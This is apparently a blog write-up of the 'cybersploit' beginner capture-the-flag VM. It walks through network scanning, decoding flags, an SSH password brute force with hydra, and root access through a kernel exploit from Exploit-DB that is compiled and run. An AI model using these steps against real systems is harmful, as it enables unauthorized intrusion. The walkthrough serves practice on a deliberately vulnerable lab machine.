---
layout: post
title: CTF cybersploit
date:   2022-01-21 13:19:23 -0600
categories: CTF
tags: Linux
---
# Description 
THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.
FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER & EXPLOIT-DB.

# netdiscover

![](https://i.imgur.com/eDewDgH.png)
192.168.0.42

# nmap

nmap -sV -p- 192.168.0.42

![](https://i.imgur.com/pbEEiON.png)

```zsh
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```
# port 80
![](https://i.imgur.com/M9w3UTm.png)

## robots.txt
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 

I think it's base64.
![](https://i.imgur.com/xTOyQCo.png)
```zsh
➜  ~ echo R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 --decode
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}%    
```

## Source code
![](https://i.imgur.com/GLMB1Iq.png)
```zsh
<!-------------username:itsskv--------------------->
```
# Gif
In the gif we have this code.
I don't know what to do with it.
It's not in hexadecimal because there is a P and S.
```
B2C B2B PSD RGB
```
# Port 22

I did a wordlist with the words in the gif and the website.
https://weakpass.com/generate
Seriously:
![](https://i.imgur.com/FTJV1k5.png)
And th password was the flag.
```zsh
hydra -l itsskv -P cyberwordlist -s 22 -f 192.168.0.42 ssh
[22][ssh] host: 192.168.0.42   login: itsskv   password: cybersploit{youtube.com/c/cybersploit}
```
## flag2.txt

```zsh
itsskv@cybersploit-CTF:~$ ls
Desktop    Downloads         flag2.txt  Pictures  Templates
Documents  examples.desktop  Music      Public    Videos
itsskv@cybersploit-CTF:~$ cat flag2.txt 
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```
![](https://i.imgur.com/Jturky3.png)
```zsh
good work !
flag2: cybersploit{https:t.me/cybersploit1}
```
## LSE.sh
```zsh
    Hostname: cybersploit-CTF
       Linux: 3.13.0-32-generic
Distribution: Ubuntu 12.04.5 LTS
Architecture: i686
============================================================( file system )=====
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/X
/usr/bin/lppasswd
---
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst100 Useful binaries................................................. yes!
```
I have one thing interestion, the ubuntu version.
 

# Exploit
https://www.exploit-db.com/exploits/37292
I can't download andd vi crash when I use it, that's why I use nano.
```bash
itsskv@cybersploit-CTF:~$ touch exp.c
itsskv@cybersploit-CTF:~$ 
itsskv@cybersploit-CTF:~$ nano exp.c 
itsskv@cybersploit-CTF:~$ gcc exp.c -o exp
itsskv@cybersploit-CTF:~$ ./exp
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

# finalflag.txt
```zsh
root@cybersploit-CTF:/home/itsskv# cat /root/finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```



















